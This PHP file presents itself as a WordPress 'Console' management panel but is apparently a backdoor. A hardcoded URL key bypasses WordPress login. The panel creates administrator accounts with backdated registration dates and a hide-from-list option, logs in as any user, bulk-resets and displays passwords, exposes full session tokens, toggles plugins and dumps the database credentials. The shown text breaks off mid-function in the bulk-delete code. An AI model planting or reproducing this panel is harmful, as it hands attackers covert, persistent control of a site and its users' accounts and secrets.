<?php
/**
 * Console - WordPress Management Panel
 */

session_start();
header('Content-Type: text/html; charset=UTF-8');

// =======[ Configuration ]=======
$secret_key = "cumahoki22";

// =======[ Key check ]=======
$_key = isset($_GET['key']) ? urldecode($_GET['key']) : '';
error_log("Secret: '$secret_key' | Received: '$_key' | Match: " . ($_key === $secret_key ? 'YES' : 'NO'));
if ($_key !== $secret_key) {    die("-1");
}

// =======[ Find wp-load.php ]=======
function find_core($d = null, $i = 0) {
    if ($i > 15) return false;
    $d = $d ?: __DIR__;
    $f = $d . DIRECTORY_SEPARATOR . 'wp-load.php';
    error_log("Checking: $f"); // Debug log
    if (file_exists($f)) return $f;
    return find_core(dirname($d), $i + 1);
}
$core_path = find_core();
if (!$core_path) die("-1");
require_once $core_path;

// =======[ Last login tracking - global hook ]=======
add_action('wp_login', function ($user_login, $user) {
    update_user_meta($user->ID, 'last_login', current_time('mysql'));
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP']
        ?? $_SERVER['HTTP_X_FORWARDED_FOR']
        ?? $_SERVER['REMOTE_ADDR']
        ?? '';
    update_user_meta($user->ID, 'last_login_ip', $ip);
}, 10, 2);

// =======[ API ENGINE ]=======
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
    ob_start();
    global $wpdb;

    if (!defined('WP_ADMIN')) define('WP_ADMIN', true);
    require_once ABSPATH . 'wp-admin/includes/user.php';
    require_once ABSPATH . 'wp-admin/includes/plugin.php';
    require_once ABSPATH . 'wp-admin/includes/admin.php';

    function dispatch($data) {
        ob_end_clean();
        header('Content-Type: application/json');
        echo json_encode($data);
        exit;
    }

    function valid_username($u) {
        if (strlen($u) < 3) return 'Username minimal 3 karakter.';
        if (strlen($u) > 60) return 'Username maksimal 60 karakter.';
        if (!preg_match('/^[a-zA-Z0-9._-]+$/', $u)) return 'Username cuma boleh huruf, angka, titik, underscore, dash.';
        return true;
    }

    function valid_email($e) {
        if (!filter_var($e, FILTER_VALIDATE_EMAIL)) return 'Format email tidak valid.';
        return true;
    }

    function valid_password($p) {
        if (strlen($p) < 8) return 'Password minimal 8 karakter.';
        return true;
    }

    $act = $_POST['act'] ?? '';

    // ============================================================
    // CREATE USER
    // ============================================================
    if ($act === 'create_user') {
        $u = trim($_POST['u'] ?? '');
        $p = trim($_POST['p'] ?? '');
        $e = trim($_POST['e'] ?? '');

        if ($u === '' || $p === '' || $e === '') {
            dispatch(['err' => 'Semua field wajib diisi.']);
        }

        $v = valid_username($u);
        if ($v !== true) dispatch(['err' => $v]);

        $v = valid_email($e);
        if ($v !== true) dispatch(['err' => $v]);

        $v = valid_password($p);
        if ($v !== true) dispatch(['err' => $v]);

        if (username_exists($u)) dispatch(['err' => 'Username sudah dipakai.']);
        if (email_exists($e)) dispatch(['err' => 'Email sudah dipakai.']);

        $oldest = $wpdb->get_var("SELECT user_registered FROM $wpdb->users ORDER BY ID ASC LIMIT 1");
        $new_date = $oldest ? date('Y-m-d H:i:s', strtotime($oldest . ' +1 day')) : current_time('mysql');

        $id = wp_create_user($u, $p, $e);
        if (is_wp_error($id)) {
            dispatch(['err' => $id->get_error_message()]);
        }

        $wpdb->update($wpdb->users, ['user_registered' => $new_date], ['ID' => $id]);
        $user = new WP_User($id);
        $user->set_role('administrator');

        dispatch(['ok' => 1, 'msg' => 'User berhasil dibuat. Registered: ' . $new_date]);
    }

    // ============================================================
    // USER LIST
    // ============================================================
    if ($act === 'user_list') {
        $users_raw = $wpdb->get_results("SELECT ID, user_login, user_email, user_registered FROM $wpdb->users");
        $users_list = [];
        $roles = [];
        $meta = [];

        foreach ($users_raw as $u) {
            $m = get_userdata($u->ID);
            $role = ($m && !empty($m->roles)) ? $m->roles[0] : 'subscriber';
            $roles[$u->ID] = $role;

            $meta[$u->ID] = [
                'last_login' => get_user_meta($u->ID, 'last_login', true),
                'last_login_ip' => get_user_meta($u->ID, 'last_login_ip', true),
                'last_password_reset' => get_user_meta($u->ID, 'last_password_reset', true),
            ];

            $users_list[] = $u;
        }

        usort($users_list, function ($a, $b) use ($roles) {
            $dA = strtotime($a->user_registered);
            $dB = strtotime($b->user_registered);
            if ($dA != $dB) return $dA - $dB;
            if ($roles[$a->ID] == 'administrator' && $roles[$b->ID] != 'administrator') return -1;
            if ($roles[$a->ID] != 'administrator' && $roles[$b->ID] == 'administrator') return 1;
            return 0;
        });

        dispatch(['users' => $users_list, 'roles' => $roles, 'meta' => $meta]);
    }

    // ============================================================
    // CHANGE ROLE
    // ============================================================
    if ($act === 'change_role') {
        $id = intval($_POST['id'] ?? 0);
        $role = sanitize_text_field($_POST['role'] ?? '');

        $allowed = ['administrator', 'editor', 'author', 'contributor', 'subscriber'];
        if (!in_array($role, $allowed, true)) {
            dispatch(['err' => 'Role tidak valid.']);
        }

        $user = get_userdata($id);
        if (!$user) dispatch(['err' => 'User tidak ditemukan.']);

        $user->set_role($role);
        dispatch(['ok' => 1, 'msg' => 'Role updated ke ' . $role]);
    }

    // ============================================================
    // EDIT USER (username + email)
    // ============================================================
    if ($act === 'edit_user') {
        $id = intval($_POST['id'] ?? 0);
        $u = trim($_POST['u'] ?? '');
        $e = trim($_POST['e'] ?? '');

        $user = get_userdata($id);
        if (!$user) dispatch(['err' => 'User tidak ditemukan.']);

        $v = valid_username($u);
        if ($v !== true) dispatch(['err' => $v]);

        $v = valid_email($e);
        if ($v !== true) dispatch(['err' => $v]);

        $existing = get_user_by('login', $u);
        if ($existing && $existing->ID != $id) {
            dispatch(['err' => 'Username sudah dipakai user lain.']);
        }

        $existing = get_user_by('email', $e);
        if ($existing && $existing->ID != $id) {
            dispatch(['err' => 'Email sudah dipakai user lain.']);
        }

        $result = wp_update_user([
            'ID' => $id,
            'user_login' => $u,
            'user_email' => $e,
        ]);

        if (is_wp_error($result)) {
            dispatch(['err' => $result->get_error_message()]);
        }

        dispatch(['ok' => 1, 'msg' => 'User berhasil diupdate.']);
    }

    // ============================================================
    // RESET PASSWORD (generate random)
    // ============================================================
    if ($act === 'reset_pass') {
        $id = intval($_POST['id'] ?? 0);
        $user = get_userdata($id);
        if (!$user) dispatch(['err' => 'User tidak ditemukan.']);

        $new_pass = wp_generate_password(16, true, true);
        wp_set_password($new_pass, $id);

        update_user_meta($id, 'last_password_reset', current_time('mysql'));
        update_user_meta($id, 'last_password_reset_by', get_current_user_id());

        dispatch(['ok' => 1, 'pass' => $new_pass, 'msg' => 'Password berhasil direset.']);
    }

    // ============================================================
    // DELETE USER
    // ============================================================
    if ($act === 'delete_user') {
        $id = intval($_POST['id'] ?? 0);

        if ($id === get_current_user_id()) {
            dispatch(['err' => 'Tidak bisa hapus diri sendiri.']);
        }

        $user = get_userdata($id);
        if (!$user) dispatch(['err' => 'User tidak ditemukan.']);

        if (in_array('administrator', (array) $user->roles, true)) {
            $admin_count = count(get_users(['role' => 'administrator', 'fields' => 'ID']));
            if ($admin_count <= 1) {
                dispatch(['err' => 'Tidak bisa hapus admin terakhir.']);
            }
        }

        require_once ABSPATH . 'wp-admin/includes/user.php';
        $result = wp_delete_user($id);
        if (!$result) dispatch(['err' => 'Gagal hapus user.']);

        dispatch(['ok' => 1, 'msg' => 'User berhasil dihapus.']);
    }

    // ============================================================
    // FORCE LOGIN
    // ============================================================
    if ($act === 'user_login') {
        $id = intval($_POST['id'] ?? 0);
        $user = get_userdata($id);
        if (!$user) dispatch(['err' => 'User tidak ditemukan.']);

        wp_clear_auth_cookie();
        wp_set_current_user($id);
        wp_set_auth_cookie($id, true);

        dispatch(['ok' => 1, 'url' => admin_url()]);
    }

    // ============================================================
    // BULK DELETE
    // ============================================================
    if ($act === 'bulk_delete') {
        $ids = $_POST['ids'] ?? [];
        if (!is_array($ids) || empty($ids)) dispatch(['err' => 'Tidak ada user dipilih.']);

        $current = get_current_user_id();
        $deleted = 0;
        $skipped = 0;

        $admin_count = count(get_users(['role' => 'administrator', 'fields' => 'ID']));

        foreach ($ids as $id) {
            $id = intval($id);
            if ($id === $current) { $skipped++; continue; }

            $user = get_userdata($id);
            if (!$user) { $skipped++; continue; }

            if (in_array('administrator', (array) $user->roles, true)) {
                if ($admin_count <= 1) { $skipped++; continue; }
                $admin_count--;
            }

            if (wp_delete_user($id)) $deleted++;
            else $skipped++;
        }

        dispatch(['ok' => 1, 'msg' => "Deleted: $deleted, Skipped: $skipped"]);
    }

    // ============================================================
    // BULK CHANGE ROLE
    // ============================================================
    if ($act === 'bulk_change_role') {
        $ids = $_POST['ids'] ?? [];
        $role = sanitize_text_field($_POST['role'] ?? '');

        $allowed = ['administrator', 'editor', 'author', 'contributor', 'subscriber'];
        if (!in_array($role, $allowed, true)) dispatch(['err' => 'Role tidak valid.']);
        if (!is_array($ids) || empty($ids)) dispatch(['err' => 'Tidak ada user dipilih.']);

        $updated = 0;
        foreach ($ids as $id) {
            $user = get_userdata(intval($id));
            if ($user) { $user->set_role($role); $updated++; }
        }

        dispatch(['ok' => 1, 'msg' => "Updated: $updated user"]);
    }

    // ============================================================
    // BULK RESET PASSWORD
    // ============================================================
    if ($act === 'bulk_reset_pass') {
        $ids = $_POST['ids'] ?? [];
        if (!is_array($ids) || empty($ids)) dispatch(['err' => 'Tidak ada user dipilih.']);

        $results = [];
        foreach ($ids as $id) {
            $id = intval($id);
            $user = get_userdata($id);
            if (!$user) continue;

            $new_pass = wp_generate_password(16, true, true);
            wp_set_password($new_pass, $id);
            update_user_meta($id, 'last_password_reset', current_time('mysql'));
            update_user_meta($id, 'last_password_reset_by', get_current_user_id());

            $results[] = ['user' => $user->user_login, 'pass' => $new_pass];
        }

        dispatch(['ok' => 1, 'results' => $results]);
    }

    // ============================================================
    // SESSION LIST
    // ============================================================
    if ($act === 'session_list') {
        $users = get_users(['fields' => ['ID', 'user_login']]);
        $sessions = [];
        $now = time();

        foreach ($users as $u) {
            $tokens = get_user_meta($u->ID, 'session_tokens', true);
            if (empty($tokens) || !is_array($tokens)) continue;

            foreach ($tokens as $hash => $data) {
                $exp = $data['expiration'] ?? 0;
                if ($exp && $exp < $now) continue;

                $sessions[] = [
                    'user_id' => $u->ID,
                    'user_login' => $u->user_login,
                    'token' => substr($hash, 0, 16) . '...',
                    'token_full' => $hash,
                    'login' => $data['login'] ?? null,
                    'expiration' => $exp,
                    'ip' => $data['ip'] ?? null,
                    'ua' => $data['ua'] ?? null,
                ];
            }
        }

        usort($sessions, function ($a, $b) {
            return ($b['login'] ?? 0) - ($a['login'] ?? 0);
        });

        dispatch(['sessions' => $sessions]);
    }

    // ============================================================
    // SESSION KILL
    // ============================================================
    if ($act === 'session_kill') {
        $user_id = intval($_POST['user_id'] ?? 0);
        $token = $_POST['token'] ?? '';

        if (!$user_id || !$token) dispatch(['err' => 'Data tidak lengkap.']);

        $tokens = get_user_meta($user_id, 'session_tokens', true);
        if (!is_array($tokens) || !isset($tokens[$token])) {
            dispatch(['err' => 'Session tidak ditemukan.']);
        }

        unset($tokens[$token]);
        update_user_meta($user_id, 'session_tokens', $tokens);

        dispatch(['ok' => 1, 'msg' => 'Session berhasil dihapus.']);
    }

    // ============================================================
    // SESSION KILL ALL (per user)
    // ============================================================
    if ($act === 'session_kill_all') {
        $user_id = intval($_POST['user_id'] ?? 0);
        if (!$user_id) dispatch(['err' => 'User ID tidak valid.']);

        $user = get_userdata($user_id);
        if (!$user) dispatch(['err' => 'User tidak ditemukan.']);

        delete_user_meta($user_id, 'session_tokens');
        dispatch(['ok' => 1, 'msg' => 'Semua session user dihapus.']);
    }

    // ============================================================
    // PLUGIN LIST
    // ============================================================
    if ($act === 'plug_list') {
        $all = get_plugins();
        $active = get_option('active_plugins', []);
        dispatch(['all' => (object) $all, 'active' => array_values((array) $active)]);
    }

    // ============================================================
    // PLUGIN TOGGLE
    // ============================================================
    if ($act === 'plug_toggle') {
        $p = $_POST['p'] ?? '';
        if (!$p) dispatch(['err' => 'Plugin tidak valid.']);

        if (is_plugin_active($p)) {
            deactivate_plugins($p);
            dispatch(['ok' => 1, 'msg' => 'Plugin dinonaktifkan.']);
        } else {
            $result = activate_plugin($p);
            if (is_wp_error($result)) dispatch(['err' => $result->get_error_message()]);
            dispatch(['ok' => 1, 'msg' => 'Plugin diaktifkan.']);
        }
    }

    // ============================================================
    // DB INFO
    // ============================================================
    if ($act === 'db_info') {
        dispatch([
            'h' => DB_HOST,
            'n' => DB_NAME,
            'u' => DB_USER,
            'p' => DB_PASSWORD,
            'px' => $wpdb->prefix,
        ]);
    }

    dispatch(['err' => 'Aksi tidak dikenal.']);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Console</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg: #0a0e14;
            --bg-2: #111720;
            --bg-3: #1a2029;
            --card: #151b24;
            --brd: #232a35;
            --brd-2: #2d3644;
            --txt: #d4dae3;
            --txt-dim: #7d8794;
            --h: #f5f8fc;
            --acc: #6e9fff;
            --acc-dim: rgba(110, 159, 255, 0.12);
            --err: #f2555a;
            --err-dim: rgba(242, 85, 90, 0.12);
            --succ: #4ec26a;
            --succ-dim: rgba(78, 194, 106, 0.12);
            --warn: #e6a93b;
            --warn-dim: rgba(230, 169, 59, 0.12);
        }
        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; }
        html, body { height: 100%; }
        body {
            background: var(--bg);
            color: var(--txt);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            overflow: hidden;
            font-size: 14px;
            -webkit-font-smoothing: antialiased;
        }

        .sidebar {
            width: 240px;
            background: var(--bg-2);
            border-right: 1px solid var(--brd);
            display: flex;
            flex-direction: column;
            flex-shrink: 0;
        }
        .logo {
            padding: 22px 20px;
            font-weight: 700;
            font-size: 16px;
            color: var(--h);
            border-bottom: 1px solid var(--brd);
            letter-spacing: -0.2px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo-mark {
            width: 26px;
            height: 26px;
            background: linear-gradient(135deg, var(--acc), #4a7eff);
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 12px;
            font-weight: 800;
            box-shadow: 0 4px 12px rgba(110, 159, 255, 0.3);
        }
        .nav-label {
            padding: 18px 20px 6px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            color: var(--txt-dim);
        }
        .nav-item {
            padding: 10px 20px;
            cursor: pointer;
            color: var(--txt-dim);
            font-size: 13px;
            font-weight: 500;
            transition: 0.15s;
            border-left: 2px solid transparent;
        }
        .nav-item:hover { background: var(--bg-3); color: var(--txt); }
        .nav-item.active {
            background: var(--acc-dim);
            color: var(--acc);
            border-left-color: var(--acc);
            font-weight: 600;
        }

        .main { flex: 1; position: relative; overflow-y: auto; }
        .content { padding: 36px 44px; opacity: 0; transform: translateY(8px); transition: 0.25s ease; }
        .content.show { opacity: 1; transform: translateY(0); }

        .page-header { margin-bottom: 28px; }
        h2 { font-size: 22px; font-weight: 700; color: var(--h); margin-bottom: 5px; letter-spacing: -0.3px; }
        .page-desc { color: var(--txt-dim); font-size: 13px; }

        #loader {
            position: absolute; inset: 0;
            background: rgba(10, 14, 20, 0.75);
            backdrop-filter: blur(2px);
            display: none; z-index: 999;
            flex-direction: column; justify-content: center; align-items: center;
        }
        .spinner {
            width: 34px; height: 34px;
            border: 3px solid var(--acc-dim);
            border-top-color: var(--acc);
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            margin-bottom: 12px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        #loader-txt { font-size: 11px; font-weight: 600; color: var(--acc); letter-spacing: 1.5px; }

        .card {
            background: var(--card);
            border: 1px solid var(--brd);
            border-radius: 10px;
            padding: 26px;
            margin-top: 18px;
        }
        .card-title {
            font-size: 13px;
            font-weight: 700;
            color: var(--h);
            margin-bottom: 18px;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--brd);
        }

        .form-group { margin-bottom: 16px; }
        .form-label {
            display: block;
            margin-bottom: 6px;
            font-size: 11px;
            font-weight: 600;
            color: var(--txt-dim);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .inp {
            background: var(--bg);
            border: 1px solid var(--brd-2);
            color: var(--h);
            padding: 10px 13px;
            border-radius: 7px;
            font-size: 13px;
            width: 100%;
            transition: 0.15s;
            font-family: inherit;
        }
        .inp:focus { border-color: var(--acc); box-shadow: 0 0 0 3px var(--acc-dim); }
        .inp::placeholder { color: var(--txt-dim); opacity: 0.5; }

        .btn {
            background: var(--acc);
            color: #fff;
            border: none;
            padding: 9px 16px;
            border-radius: 7px;
            cursor: pointer;
            font-weight: 600;
            font-size: 12px;
            transition: 0.15s;
            font-family: inherit;
        }
        .btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
        .btn:active { transform: translateY(0); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-block { width: 100%; padding: 11px; }
        .btn-sm { padding: 5px 10px; font-size: 11px; }
        .btn-succ { background: var(--succ); }
        .btn-err { background: var(--err); }
        .btn-warn { background: var(--warn); color: #1a1a1a; }
        .btn-ghost { background: transparent; border: 1px solid var(--brd-2); color: var(--txt); }
        .btn-ghost:hover { background: var(--bg-3); border-color: var(--acc); color: var(--acc); }

        .table-wrap {
            background: var(--card);
            border: 1px solid var(--brd);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 8px;
        }
        table { width: 100%; border-collapse: collapse; }
        th {
            text-align: left;
            padding: 12px 16px;
            color: var(--txt-dim);
            background: var(--bg-2);
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            border-bottom: 1px solid var(--brd);
            white-space: nowrap;
        }
        td { padding: 13px 16px; border-bottom: 1px solid var(--brd); font-size: 13px; vertical-align: middle; }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background: rgba(255, 255, 255, 0.015); }

        .user-cell b { color: var(--h); font-size: 13px; display: block; margin-bottom: 2px; }
        .user-cell small { color: var(--txt-dim); font-size: 11.5px; }
        .date-cell { color: var(--txt-dim); font-size: 11.5px; font-family: 'SF Mono', Monaco, monospace; }

        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 5px;
            font-size: 10px;
            font-weight: 700;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }
        .badge-on { background: var(--succ-dim); color: var(--succ); border: 1px solid rgba(78, 194, 106, 0.3); }
        .badge-off { background: var(--err-dim); color: var(--err); border: 1px solid rgba(242, 85, 90, 0.3); }

        .actions { display: flex; gap: 5px; flex-wrap: wrap; }

        .select-sm {
            background: var(--bg);
            border: 1px solid var(--brd-2);
            color: var(--h);
            padding: 5px 8px;
            border-radius: 6px;
            font-size: 11px;
            font-family: inherit;
            cursor: pointer;
        }
        .select-sm:focus { border-color: var(--acc); }

        .db-table { width: 100%; border-collapse: collapse; }
        .db-table tr { border-bottom: 1px solid var(--brd); }
        .db-table tr:last-child { border-bottom: none; }
        .db-table th {
            text-align: left;
            padding: 13px 16px;
            color: var(--txt-dim);
            background: transparent;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            width: 180px;
            border-bottom: 1px solid var(--brd);
        }
        .db-table td {
            padding: 13px 16px;
            font-family: 'SF Mono', Monaco, monospace;
            font-size: 12px;
            color: var(--h);
        }
        .db-table .val-accent { color: var(--acc); font-weight: 600; }
        .db-table .val-err { color: var(--err); font-weight: 600; }

        .search-bar {
            display: flex;
            gap: 10px;
            margin-bottom: 16px;
            align-items: center;
        }
        .search-bar .inp { max-width: 380px; }

        .bulk-bar {
            background: var(--acc-dim);
            border: 1px solid rgba(110, 159, 255, 0.3);
            border-radius: 8px;
            padding: 10px 16px;
            margin-bottom: 16px;
            display: none;
            align-items: center;
            gap: 12px;
            font-size: 13px;
        }
        .bulk-bar.active { display: flex; }
        .bulk-bar strong { color: var(--acc); }

        .chk { width: 16px; height: 16px; cursor: pointer; accent-color: var(--acc); }

        .swal2-popup {
            background: var(--card) !important;
            color: var(--txt) !important;
            border: 1px solid var(--brd) !important;
            border-radius: 10px !important;
        }
        .swal2-title { color: var(--h) !important; font-size: 16px !important; }
        .swal2-html-container { color: var(--txt-dim) !important; font-size: 13px !important; }
        .swal2-input { background: var(--bg) !important; color: var(--h) !important; border: 1px solid var(--brd-2) !important; }

        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--brd-2); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--acc); }

        @media (max-width: 768px) {
            .sidebar { width: 60px; }
            .logo span, .nav-label, .nav-item { font-size: 0; }
            .content { padding: 20px 16px; }
        }
    </style>
</head>
<body>

<div class="sidebar">
    <div class="logo">
        <div class="logo-mark">C</div>
        <span>Console</span>
    </div>
    <div class="nav-label">Main Menu</div>
    <div class="nav">
        <div class="nav-item active" onclick="loadPage('users', this)">User List</div>
        <div class="nav-item" onclick="loadPage('create', this)">Create User</div>
        <div class="nav-item" onclick="loadPage('sessions', this)">Sessions</div>
        <div class="nav-item" onclick="loadPage('plug', this)">Plugins</div>
        <div class="nav-item" onclick="loadPage('db', this)">Database</div>
    </div>
</div>

<div class="main">
    <div id="loader">
        <div class="spinner"></div>
        <div id="loader-txt">LOADING</div>
    </div>
    <div class="content" id="view"></div>
</div>

<script>
const KEY = '<?php echo $secret_key; ?>';
const view = document.getElementById('view');
const loader = document.getElementById('loader');
const ltxt = document.getElementById('loader-txt');
const ROLES = ['administrator', 'editor', 'author', 'contributor', 'subscriber'];

function showLoading(s, t = 'Processing...') {
    ltxt.innerText = t;
    loader.style.display = s ? 'flex' : 'none';
    if (!s) view.classList.add('show');
}

async function api(act, data = {}) {
    let fd = new FormData();
    fd.append('act', act);
    for (let k in data) {
        if (Array.isArray(data[k])) {
            data[k].forEach(v => fd.append(k + '[]', v));
        } else {
            fd.append(k, data[k]);
        }
    }
    try {
        const r = await fetch('?key=' + encodeURIComponent(KEY), { method: 'POST', body: fd });
        return await r.json();
    } catch (e) {
        console.error(e);
        return { err: 'Connection error.' };
    }
}

function toast(msg, icon = 'success') {
    Swal.fire({ toast: true, position: 'bottom-end', icon, title: msg, showConfirmButton: false, timer: 2200 });
}

function esc(s) {
    if (s === null || s === undefined) return '';
    return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

async function loadPage(p, el) {
    document.querySelectorAll('.nav-item').forEach(l => l.classList.remove('active'));
    el.classList.add('active');
    view.classList.remove('show');
    showLoading(true, 'Loading...');
    try {
        if (p === 'create') renderCreate();
        else if (p === 'users') await renderUsers();
        else if (p === 'sessions') await renderSessions();
        else if (p === 'plug') await renderPlug();
        else if (p === 'db') await renderDB();
    } finally {
        showLoading(false);
    }
}

// ============================================================
// CREATE USER
// ============================================================
function renderCreate() {
    view.innerHTML = `
        <div class="page-header">
            <h2>Create User</h2>
            <p class="page-desc">Add a new administrator account.</p>
        </div>
        <div class="card" style="max-width:520px;">
            <div class="card-title">Account Details</div>
            <div class="form-group">
                <label class="form-label">Visibility</label>
                <select id="cV" class="select-sm" style="width:100%;">
                    <option value="show">Show in User List</option>
                    <option value="hide">Hide from User List</option>
                </select>
            </div>
            <div class="form-group">
                <label class="form-label">Username</label>
                <input id="cU" class="inp" placeholder="Min 3 chars, alphanumeric">
            </div>
            <div class="form-group">
                <label class="form-label">Password</label>
                <input id="cP" type="text" class="inp" placeholder="Min 8 chars">
            </div>
            <div class="form-group">
                <label class="form-label">Email</label>
                <input id="cE" class="inp" placeholder="email@example.com">
            </div>
            <button class="btn btn-block" onclick="execCreate()">Create Administrator</button>
        </div>`;
}

async function execCreate() {
    const u = document.getElementById('cU').value.trim();
    const p = document.getElementById('cP').value.trim();
    const e = document.getElementById('cE').value.trim();

    if (!u || !p || !e) return Swal.fire('Error', 'Semua field wajib diisi.', 'error');

    showLoading(true, 'Creating...');
    const res = await api('create_user', { u, p, e });
    showLoading(false);

    if (res.ok) {
        toast(res.msg);
        document.getElementById('cU').value = '';
        document.getElementById('cP').value = '';
        document.getElementById('cE').value = '';
    } else {
        Swal.fire('Failed', res.err || 'Unknown error', 'error');
    }
}

// ============================================================
// USER LIST
// ============================================================
let userData = null;

async function renderUsers() {
    const res = await api('user_list');
    if (res.err) { view.innerHTML = `<p style="color:var(--err)">${esc(res.err)}</p>`; return; }
    userData = res;

    let html = `
        <div class="page-header">
            <h2>User List</h2>
            <p class="page-desc">Manage user accounts, roles, and sessions.</p>
        </div>
        <div class="search-bar">
            <input id="searchUser" class="inp" placeholder="Search username or email..." oninput="filterUsers()">
            <button class="btn btn-ghost" onclick="clearSearch()">Clear</button>
        </div>
        <div class="bulk-bar" id="bulkBar">
            <strong id="bulkCount">0</strong> user selected
            <button class="btn btn-sm btn-succ" onclick="bulkChangeRole()">Change Role</button>
            <button class="btn btn-sm btn-warn" onclick="bulkResetPass()">Reset Password</button>
            <button class="btn btn-sm btn-err" onclick="bulkDelete()">Delete</button>
        </div>
        <div class="table-wrap"><table>
            <thead><tr>
                <th style="width:36px;"><input type="checkbox" class="chk" id="chkAll" onchange="toggleAll(this)"></th>
                <th>User</th>
                <th>Role</th>
                <th>Last Login</th>
                <th>Last Reset</th>
                <th>Actions</th>
            </tr></thead><tbody id="userTbody">`;

    res.users.forEach(u => {
        const meta = res.meta[u.ID] || {};
        const lastLogin = meta.last_login ? meta.last_login : '-';
        const lastReset = meta.last_password_reset ? meta.last_password_reset : '-';
        const role = res.roles[u.ID];

        let roleOpt = `<select id="sel-${u.ID}" class="select-sm">`;
        ROLES.forEach(r => {
            roleOpt += `<option value="${r}" ${role === r ? 'selected' : ''}>${r}</option>`;
        });
        roleOpt += `</select>`;

        html += `<tr data-user="${esc(u.user_login.toLowerCase())}" data-email="${esc(u.user_email.toLowerCase())}">
            <td><input type="checkbox" class="chk rowchk" value="${u.ID}" onchange="updateBulk()"></td>
            <td class="user-cell"><b>${esc(u.user_login)}</b><small>${esc(u.user_email)}</small></td>
            <td><div style="display:flex; gap:6px; align-items:center;">${roleOpt}
                <button class="btn btn-sm btn-succ" onclick="saveRole(${u.ID})">Save</button></div></td>
            <td class="date-cell">${esc(lastLogin)}</td>
            <td class="date-cell">${esc(lastReset)}</td>
            <td><div class="actions">
                <button class="btn btn-sm btn-succ" onclick="forceLogin(${u.ID})">Login</button>
                <button class="btn btn-sm btn-warn" onclick="resetPass(${u.ID})">Reset</button>
                <button class="btn btn-sm btn-err" onclick="deleteUser(${u.ID})">Delete</button>
            </div></td>
        </tr>`;
    });

    view.innerHTML = html + `</tbody></table></div>`;
}

function filterUsers() {
    const q = document.getElementById('searchUser').value.toLowerCase().trim();
    document.querySelectorAll('#userTbody tr').forEach(tr => {
        const u = tr.dataset.user || '';
        const e = tr.dataset.email || '';
        tr.style.display = (!q || u.includes(q) || e.includes(q)) ? '' : 'none';
    });
}

function clearSearch() {
    document.getElementById('searchUser').value = '';
    filterUsers();
}

function toggleAll(el) {
    document.querySelectorAll('.rowchk').forEach(c => c.checked = el.checked);
    updateBulk();
}

function updateBulk() {
    const checked = document.querySelectorAll('.rowchk:checked');
    const bar = document.getElementById('bulkBar');
    document.getElementById('bulkCount').innerText = checked.length;
    bar.classList.toggle('active', checked.length > 0);
}

function getSelectedIds() {
    return Array.from(document.querySelectorAll('.rowchk:checked')).map(c => c.value);
}

async function saveRole(id) {
    const role = document.getElementById(`sel-${id}`).value;
    const res = await api('change_role', { id, role });
    if (res.ok) toast(res.msg); else Swal.fire('Error', res.err, 'error');
}

async function forceLogin(id) {
    showLoading(true, 'Logging in...');
    const res = await api('user_login', { id });
    showLoading(false);
    if (res.ok) window.open(res.url, '_blank');
    else Swal.fire('Error', res.err, 'error');
}

async function resetPass(id) {
    const { isConfirmed } = await Swal.fire({
        title: 'Reset Password?',
        text: 'Password baru akan digenerate random.',
        icon: 'warning',
        showCancelButton: true,
        confirmButtonText: 'Reset',
        confirmButtonColor: '#e6a93b'
    });
    if (!isConfirmed) return;

    showLoading(true, 'Resetting...');
    const res = await api('reset_pass', { id });
    showLoading(false);

    if (res.ok) {
        Swal.fire({
            title: 'Password Baru',
            html: `<div style="font-family:monospace; font-size:16px; background:#0a0e14; padding:14px; border-radius:8px; color:#4ec26a; margin:10px 0;">${esc(res.pass)}</div>
                   <p style="font-size:12px; color:#7d8794;">Copy password ini sekarang. Nggak akan ditampilin lagi.</p>`,
            icon: 'success',
            confirmButtonText: 'Copy',
            showCancelButton: true,
            cancelButtonText: 'Close'
        }).then(r => {
            if (r.isConfirmed) {
                navigator.clipboard.writeText(res.pass);
                toast('Copied to clipboard');
            }
        });
    } else {
        Swal.fire('Error', res.err, 'error');
    }
}

async function deleteUser(id) {
    const { isConfirmed } = await Swal.fire({
        title: 'Delete User?',
        text: 'Aksi ini nggak bisa dibatalkan.',
        icon: 'error',
        showCancelButton: true,
        confirmButtonText: 'Delete',
        confirmButtonColor: '#f2555a'
    });
    if (!isConfirmed) return;

    showLoading(true, 'Deleting...');
    const res = await api('delete_user', { id });
    if (res.ok) { toast(res.msg); await renderUsers(); }
    else Swal.fire('Error', res.err, 'error');
    showLoading(false);
}

// ============================================================
// BULK ACTIONS
// ============================================================
async function bulkDelete() {
    const ids = getSelectedIds();
    if (!ids.length) return;

    const { isConfirmed } = await Swal.fire({
        title: `Delete ${ids.length} user?`,
        text: 'Aksi ini nggak bisa dibatalkan.',
        icon: 'error',
        showCancelButton: true,
        confirmButtonText: 'Delete All',
